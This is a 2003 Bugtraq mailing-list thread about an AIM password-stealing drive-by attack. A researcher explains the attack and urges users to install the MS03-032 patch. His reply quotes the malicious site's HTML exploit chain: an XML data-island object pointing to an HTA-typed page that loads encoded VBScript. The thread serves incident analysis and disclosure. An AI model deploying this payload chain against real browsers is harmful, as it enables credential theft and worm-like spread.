
Date: Tue, 23 Sep 2003 14:05:40 -0700
From: "Thor Larholm" <thor@...x.com>
To: "Mark Coleman" <markc@...ontown.com>, <bugtraq@...urityfocus.org>
Subject: RE: [Fwd: Re: AIM Password theft]


This is just a simple exploit utilizing the Object Data vulnerability
discovered by Drew Copley, coupled with the GreyMagic no-script HTML
rendering as demonstrated earlier on this list and others by jelmer.

Tell your user to go install MS03-032, which he obviously did not do as
MS03-032 patches this vulnerability. MS03-032 was released on August 20
and you can find it at

http://www.microsoft.com/technet/security/bulletin/MS03-032.asp

Now, for some details:

www.haxr.org contains the following HTML code (with <> replaced to []):

[span datasrc="#oExec" datafld="counter" dataformatas="html"][/span]
[xml id="oExec"]
[security]
[counter]
[![CDATA[
[object data=tracker.php][/object]
]]]
[/counter]
[/security]
[/xml]

Tracker.php contains the following HTTP header:

Content-Type: application/hta

And the following HTML code:

[html]
[head]
[/head]
[body]
[script language="VBScript.Encode" src="exec.vbs"][/script]
[body]
[/html]

You already gave us a copy of exec.vbs, so no reason to repeat that.


Now, if any mind-boggling lame antivirus system shouts back at me for
repeating GM#001 or the Object Data HTTP header, I reserve the right to
mail your system administrator and notify him of his malfunctioning
software.



Regards
Thor Larholm
PivX Solutions, LLC - Senior Security Researcher
http://www.pivx.com/larholm/unpatched - Unpatched IE vulnerabilities



-----Original Message-----
From: Mark Coleman [mailto:markc@...ontown.com] 
Sent: Tuesday, September 23, 2003 9:43 AM
To: bugtraq@...urityfocus.org
Subject: [Fwd: Re: AIM Password theft]


Hi, can anyone shed some light on this for me?  If this is new, its 
going to spread like wildfire.  AOL or incidents lists have yet to 
reply....  it appears to be a legitimate threat as I have at least one 
user "infected" already..  Thank you..

-Mark Coleman

--------------

Hi, please find attached the vbs code that appears to be running when 
visitors hit www.haxr.org.

This reportedly pulls username/password from registry of AIM accounts, 
then something elsewhere gets buddy lists through this password theft 
and sends links to them via AOL to start the process again.

We've had at least one "infection" if you want to call it that, and a 
user's AIM account was hijacked and this link sent to all users in his 
buddy list which then propelled the "infection" as they click the link 
to www.haxr.org.

Does anyone have any information about this issue?  Any help on this 
would be greatly appreciated. Still chasing it down..

-Mark Coleman



Mark Coleman wrote:

> I just started investigating a report that appears to have merit of a
> username/password theft of AIM accounts.
>
> Users are being directed to a web page located at www.haxr.org where
> the source appears to run a javascript program that is proportedly 
> stealing AIM usernames/passwords/buddy lists.
>
> Does anyone have any information related to www. haxr.org or the
> technique being used?
> Please be careful when visiting the page, it pulls script off of a 
> yahoo site.
>
> I am finding nothing in any of the initial searches that I am doing.
>
> Any help/insight would be greatly appreciated.
>
> -Mark Coleman
>
>
>



